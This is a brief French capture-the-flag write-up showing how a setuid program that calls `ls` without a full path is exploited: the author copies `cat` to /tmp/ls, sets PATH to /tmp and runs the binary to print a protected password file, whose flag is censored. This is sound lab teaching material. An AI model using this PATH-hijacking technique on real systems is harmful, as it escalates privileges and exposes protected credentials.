En listant le répertoire on remarque qu’on possède l’attribute `s` sur l’exécutable `ch11`.
Ce qui veut dire qu’on le lance avec les droits de l’owner, qui est `app-script-ch11-cracked`, soit le même owner que le fichier `.passwd`.
```
app-script-ch11@challenge02:~$ ls -la
total 24
dr-xr-x---  2 app-script-ch11-cracked app-script-ch11         4096 Aug 11  2015 .
drwxr-xr-x 14 root                    root                    4096 Nov 17 21:47 ..
-r--r-----  1 app-script-ch11-cracked app-script-ch11-cracked   14 Feb  8  2012 .passwd
-r-sr-x---  1 app-script-ch11-cracked app-script-ch11         7160 Aug 11  2015 ch11
-r--r-----  1 app-script-ch11         app-script-ch11          153 Aug 11  2015 ch11.c
```
Afin d’exécuter `cat` à la place de `ls` il suffit de copier l’exécutable dans `/tmp`
```
app-script-ch11@challenge02:~$ cp /bin/cat /tmp/ls
```
puis de changer la valeur de la variable d’environnement `PATH`
```
app-script-ch11@challenge02:~$ PATH=/tmp
app-script-ch11@challenge02:~$ echo $PATH
/tmp
```
Donc lorsque on exécutera une nouvelle fois le fichier `ch11` il lancera le programme `/tmp/ls` qui est une copie de `/bin/cat` et affichera donc le mot de passe !
```
app-script-ch11@challenge02:~$ ./ch11
!oPe[... flag censuré ...]5
```
